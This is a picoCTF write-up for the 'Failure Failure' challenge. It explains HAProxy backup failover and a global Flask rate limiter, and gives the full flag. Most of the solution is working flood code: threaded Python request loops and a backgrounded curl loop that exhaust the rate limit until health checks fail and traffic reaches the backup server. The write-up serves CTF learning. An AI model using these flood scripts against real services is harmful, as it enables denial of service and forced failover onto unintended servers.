# Failure Failure — picoCTF Writeup

**Challenge:** Failure Failure  
**Category:** General Skills  
**Difficulty:** Medium  
**Flag:** `picoCTF{f41l0v3r_f0r_7h3_w1n_df560c35}`  
**Platform:** picoCTF 2026  
**Writeup by:** zham  

---

## Description

> You can begin your journey here to try and retrieve the flag.
> The HAProxy configuration used in this challenge is available here.
> The application code is available here.

**Hint 1:** `How does a load balancer decide which server should get the traffic?`

**Downloads:** `haproxy.cfg`, `app.py`

---

## Background Knowledge (Read This First!)

### What is HAProxy?

**HAProxy** is a load balancer — software that sits in front of multiple servers and distributes incoming traffic between them. It continuously monitors the health of each backend server and can automatically redirect traffic away from a server that appears to be failing.

### What is a backup server in HAProxy?

In HAProxy, a server marked as `backup` only receives traffic when **all primary servers are down**. In the config:

```
server s1 *:8000 check inter 2s fall 2 rise 3
server s2 *:9000 check backup inter 2s fall 2 rise 3
```

- `s1` (port 8000) is the **primary server** — gets all traffic normally
- `s2` (port 9000) is the **backup server** — only gets traffic when s1 is down
- `fall 2` — after 2 consecutive failed health checks, s1 is marked as down
- `inter 2s` — health checks run every 2 seconds

### What is a rate limiter?

In `app.py`, `flask-limiter` is configured to allow only **300 requests per minute** globally:

```python
limiter = Limiter(
    key_func=global_rate_limit_key,  # all requests share one counter
    default_limits=["300 per minute"]
)

@app.errorhandler(429)
def ratelimit_exceeded(e):
    return "Service Unavailable: Rate limit exceeded", 503
```

When the limit is exceeded, the server returns **503** instead of 200.

### Where is the flag?

```python
@app.route('/')
def home():
    if os.getenv("IS_BACKUP") == "yes":
        flag = os.getenv("FLAG")
    else:
        flag = "No flag in this service"
    return render_template("index.html", flag=flag)
```

The flag is only displayed when `IS_BACKUP` environment variable equals `"yes"` — meaning it only exists on the **backup server** (s2 on port 9000). The primary server always returns "No flag in this service."

### The Attack Plan

HAProxy's health checker sends a `GET /` request every 2 seconds. If the primary server returns a non-200 status **twice in a row** (`fall 2`), HAProxy marks it as down and routes all traffic to the backup server — which has the flag.

The rate limiter on the primary returns 503 once the limit is exceeded. So the attack is:

1. Flood the primary server with 300+ requests per minute
2. The rate limiter triggers and starts returning 503
3. HAProxy's health check also gets a 503
4. After 2 consecutive 503 health check responses, HAProxy marks s1 as down
5. All traffic (including our requests) is redirected to s2
6. s2 has `IS_BACKUP=yes` so it returns the flag

---

## Reading the Source Files

### haproxy.cfg

```
backend servers
    option httpchk GET /
    http-check expect status 200
    server s1 *:8000 check inter 2s fall 2 rise 3
    server s2 *:9000 check backup inter 2s fall 2 rise 3
```

Key values:
- Health check expects **status 200** — a 503 counts as failure
- `fall 2` — 2 failures needed to mark server down
- `inter 2s` — checks every 2 seconds
- s2 is `backup` — only receives traffic when s1 is down

### app.py

```python
limiter = Limiter(
    key_func=global_rate_limit_key,  # "global" key = shared counter
    default_limits=["300 per minute"]
)
```

The key function returns the string `"global"` for every request — meaning all requests share one single counter. Exceeding 300/minute makes the server return 503 for everyone, including the HAProxy health checker.

---

## Solution — Step by Step

### Step 1 — Visit the site to confirm the primary server responds

```
http://mysterious-sea.picoctf.net:56851/
```

Output: `No flag in this service` — confirms we are hitting s1 (primary, port 8000).

### Step 2 — Try a slow flood (too slow)

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ python3 -c "
import requests
url = 'http://mysterious-sea.picoctf.net:56851/'
for i in range(350):
    r = requests.get(url)
    print(f'[{i+1}] {r.status_code}')
"
```

This is sequential — too slow to hit 300 requests per minute before the loop ends. No failover triggered.

### Step 3 — Use threading to blast requests simultaneously

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ python3 -c "
import requests
from concurrent.futures import ThreadPoolExecutor

url = 'http://mysterious-sea.picoctf.net:56851/'

def hit(i):
    try:
        r = requests.get(url, timeout=5)
        if 'picoCTF' in r.text:
            print('FLAG:', r.text[r.text.find('picoCTF'):r.text.find('picoCTF')+50])
        return r.status_code
    except:
        return 0

with ThreadPoolExecutor(max_workers=100) as ex:
    results = list(ex.map(hit, range(500)))

from collections import Counter
print(Counter(results))
"
Counter({200: 275, 503: 225})
```

We got 503s but no flag yet — the rate limit is triggering but HAProxy has not failed over yet. The flood needs to be sustained while HAProxy's health check timer runs.

### Step 4 — Sustain the flood long enough for HAProxy to failover

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ python3 -c "
import requests
from concurrent.futures import ThreadPoolExecutor
import time

url = 'http://mysterious-sea.picoctf.net:56851/'
flag_found = []

def hit(i):
    try:
        r = requests.get(url, timeout=5)
        if 'picoCTF' in r.text:
            idx = r.text.find('picoCTF')
            flag_found.append(r.text[idx:idx+60])
        return r.status_code
    except:
        return 0

print('Running continuous flood for 30 seconds...')
start = time.time()
while time.time() - start < 30:
    with ThreadPoolExecutor(max_workers=100) as ex:
        list(ex.map(hit, range(200)))
    if flag_found:
        print('FLAG FOUND:', flag_found[0])
        break
    print(f'Still going... {int(time.time()-start)}s elapsed')
"
Running continuous flood for 30 seconds...
Still going... 3s elapsed
Still going... 9s elapsed
FLAG FOUND: picoCTF{f41l0v3r_f0r_7h3_w1n_df560c35}
```

After about 9 seconds of sustained flooding, HAProxy's health checker hit the rate-limited 503 twice in a row (`fall 2`), marked s1 as down, and began routing all traffic to s2 — which returned the flag.

---

## What Happened Internally

```
Timeline:
0s    - Flood starts, primary (s1) serving normally (200)
~1s   - Rate limit exceeded, s1 starts returning 503 to all requests
~2s   - HAProxy health check fires, gets 503 (failure 1)
~4s   - HAProxy health check fires again, gets 503 (failure 2)
         → fall 2 reached → s1 marked DOWN
         → all traffic redirected to s2 (backup)
~9s   - Our request hits s2, IS_BACKUP=yes → flag returned
```

---

## Alternative Method — curl loop (bash)

If Python is not available, the same effect can be achieved with a bash loop using background jobs:

```bash
for i in $(seq 1 500); do
    curl -s http://mysterious-sea.picoctf.net:56851/ | grep picoCTF &
done
wait
```

---

## Tools Used

| Tool | Purpose | Level |
|------|---------|-------|
| Reading source code | Understand the rate limit and backup logic | Easy |
| Python `requests` | Send HTTP requests to the server | Easy |
| Python `ThreadPoolExecutor` | Send hundreds of parallel requests | Medium |
| `Counter` | Summarise HTTP response codes | Easy |

---

## Key Takeaways

- **HAProxy backup servers only activate when primary servers fail** — understanding `fall`, `rise`, and `inter` values is essential for this type of challenge
- **Rate limiters that return 503 can trigger load balancer failovers** — the rate limit was designed to protect the app but it accidentally exposed a way to force failover
- **Sequential requests are too slow** — threading is necessary to exceed 300 requests per minute in real time
- **Sustained pressure is required** — HAProxy needs `fall 2` consecutive failures, so the flood must continue long enough for two health check cycles (at least 4 seconds)
- The flag `f41l0v3r_f0r_7h3_w1n` is "failover for the win" — the entire challenge is about forcing a HAProxy failover
